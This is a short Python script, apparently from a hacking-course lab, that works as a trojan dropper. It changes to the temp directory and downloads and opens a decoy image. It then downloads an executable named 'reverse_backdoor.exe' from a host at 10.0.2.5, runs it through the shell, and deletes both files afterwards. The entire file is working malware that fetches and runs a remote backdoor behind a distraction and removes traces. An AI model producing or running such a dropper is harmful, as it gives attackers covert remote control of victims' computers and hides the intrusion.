#! /usr/bin/env python
# Compatibility: Python X TODO: add compatibility status everywhere.
# Might need renaming in the future.

import requests
import subprocess
import os
import tempfile


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as file:
        file.write(get_response.content)


os.chdir(tempfile.gettempdir())
# The code below requires the obligatory download of a picture before executing the script.
# TODO: store jackdaw.jpeg in a variable
download("http://10.0.2.5/downloads/jackdaw.jpeg")
subprocess.Popen("jackdaw.jpeg", shell=True)
# Yeah, you gotta have the file below too.
download("http://10.0.2.5/downloads/reverse_backdoor.exe")
subprocess.call("reverse_backdoor.exe", shell=True)

os.remove("jackdaw.jpeg")
os.remove("reverse_backdoor.exe")
